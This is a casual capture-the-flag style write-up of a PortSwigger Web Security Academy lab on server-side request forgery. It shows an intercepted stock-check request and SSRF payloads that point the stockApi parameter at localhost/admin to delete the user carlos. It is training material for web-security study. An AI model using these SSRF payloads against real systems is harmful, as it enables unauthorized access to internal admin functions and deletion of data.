---
title: "SSRF: challange 1"
date: "2024-02-09"
thumbnail: "/assets/img/thumbnail/ssrf.png"
---

# Basic SSRF against the local server
---

Link: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

### solution

- start the lab and remember the objective is to open `/admin` and delete the user carlos
- if u try going to `/admin` endpoint, you will n't get the result as u can't access it directly u will get this message `Admin interface only available if logged in as an administrator, or if requested from loopback`
- so let's go to products and click check stock as challange describtion said
- intercept this request

```
POST /product/stock HTTP/1.1
Host: 0a81005f047071e181a5de86001a00cb.web-security-academy.net
Cookie: session=CMThK0h99viMGTnCHS5TWoh3xgfVOzH5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a81005f047071e181a5de86001a00cb.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0a81005f047071e181a5de86001a00cb.web-security-academy.net
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
```
- notice that stockApi parameter has a url as a value, so let's try to change it to `http://localhost/admin` and the send the request
- Nice we got response with status code 200 OK
- when we look at the response body we see this

```html
<div>
    <span>wiener - </span>
    <a href="/admin/delete?username=wiener">Delete</a>
</div>
<div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>
```
- and that's what we exactly need
- send the previous request again but with stockApi parameter value = `http://localhost/admin/delete?username=carlos`
- Carlos is deleted
- Congratzzzzzzzzzzzzzzzzzzzzzzzzzzzz